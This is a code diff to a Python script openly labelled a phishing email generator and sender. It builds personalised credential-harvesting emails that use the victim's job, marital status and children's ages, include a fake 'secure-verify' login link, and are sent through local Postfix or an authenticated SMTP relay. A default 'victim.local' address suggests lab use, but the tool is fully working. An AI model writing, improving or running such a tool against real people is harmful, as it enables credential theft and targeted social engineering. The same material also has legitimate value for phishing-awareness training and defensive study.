@@ -14,7 +14,6 @@ def generate_phishing_email(username, mail_service, title, job_title, status, ki
         return f"especially with children aged between {min(ages)} and {max(ages)}"
 
     kids_note = format_kids_message(kids)
-
     fake_link = f"http://{mail_service.lower()}-secure-verify.com/login"
 
     email_html = f"""
@@ -69,7 +68,7 @@ def generate_phishing_email(username, mail_service, title, job_title, status, ki
             </div><br>
             <p>Dear {title} {username},</p>
 
-            <p>As a valued {job_title} in our organization, and considering your {status} status {("- " + kids_note) if kids_note else ""}, we want to ensure uninterrupted access to your {mail_service} services.</p>
+            <p>As a valued {job_title} in our organization, and considering your {status} status{(" - " + kids_note) if kids_note else ""}, we want to ensure uninterrupted access to your {mail_service} services.</p>
 
             <p>We’ve detected system-wide updates affecting some user accounts. To avoid disruptions, please validate your credentials through our secure portal.</p>
 
@@ -87,7 +86,7 @@ def generate_phishing_email(username, mail_service, title, job_title, status, ki
     """
     return email_html
 
-def send_email(smtp_host, smtp_port, smtp_user, smtp_pass, from_email, to_email, subject, body_html):
+def send_email(from_email, to_email, subject, body_html, use_local=True, smtp_info=None):
     msg = MIMEMultipart("alternative")
     msg["Subject"] = subject
     msg["From"] = from_email
@@ -97,38 +96,46 @@ def send_email(smtp_host, smtp_port, smtp_user, smtp_pass, from_email, to_email,
     msg.attach(part)
 
     try:
-        with smtplib.SMTP(smtp_host, smtp_port) as server:
-            server.starttls()
-            server.login(smtp_user, smtp_pass)
-            server.sendmail(from_email, [to_email], msg.as_string())
-            print(f"\n✅ Email sent successfully to {to_email}")
+        if use_local:
+            with smtplib.SMTP("localhost", 25) as server:
+                server.sendmail(from_email, [to_email], msg.as_string())
+        else:
+            with smtplib.SMTP(smtp_info["host"], smtp_info["port"]) as server:
+                server.starttls()
+                server.login(smtp_info["user"], smtp_info["pass"])
+                server.sendmail(from_email, [to_email], msg.as_string())
+        print(f"\nEmail sent successfully to {to_email}")
     except Exception as e:
-        print(f"\n❌ Failed to send email: {e}")
-
+        print(f"\nFailed to send email: {e}")
 
 if __name__ == "__main__":
-    print("=== Phishing Email Generator & Sender (HTML) ===")
+    print("=== Phishing Email Generator & Sender ===")
     username = input("Victim's name: ")
     mail_service = input("Mail service (e.g., Gmail): ")
     title = input("Title (Mr./Ms./Dr.): ")
     job_title = input("Job title: ")
-    status = input("Personal status: ")
-    has_kids = input("Has kids? (yes/no): ").lower()
-    kids_ages = input("Enter kids' ages (comma-separated): ") if has_kids == "yes" else ""
+    status = input("Personal status: ").lower()
+    has_kids = input("Has kids? (y/N): ").lower()
+    kids_ages = input("Enter kids' ages (comma-separated): ") if has_kids == "y" or has_kids == "yes" else ""
 
     email_html = generate_phishing_email(username, mail_service, title, job_title, status, kids_ages)
 
     print("\n--- Email Preview (HTML) ---\n")
     print(email_html)
 
-    send_now = input("\nSend this email? (yes/no): ").lower()
-    if send_now == "yes":
-        smtp_host = input("SMTP server (e.g., mail.smtp2go.com): ")
-        smtp_port = int(input("SMTP port (e.g., 587): "))
-        smtp_user = input("SMTP username: ")
-        smtp_pass = input("SMTP password: ")
-        from_email = input("From (your email address): ")
-        to_email = input("To (victim's email address): ")
+    send_now = input("\nSend this email? (y/N): ").lower()
+    if send_now == "y" or send_now == "yes":
+        from_email = input("From (e.g., alice.hr@company.com): ")
+        to_email = input("To [default: victim@victim.local]: ") or "victim@victim.local"
 
-        send_email(smtp_host, smtp_port, smtp_user, smtp_pass, from_email, to_email, "Account Security Update",
-                   email_html)
+        mode = input("Use local Postfix? (Y/n): ").lower()
+        use_local = (mode != "no" and mode != "n")
+
+        smtp_info = {}
+        if not use_local:
+            smtp_info["host"] = input("SMTP server (e.g., smtp.mail.com): ")
+            smtp_info["port"] = int(input("SMTP port (e.g., 587): "))
+            smtp_info["user"] = input("SMTP username: ")
+            smtp_info["pass"] = input("SMTP password: ")
+
+        send_email(from_email, to_email, "Account Security Update", email_html, use_local, smtp_info if not use_local else None)
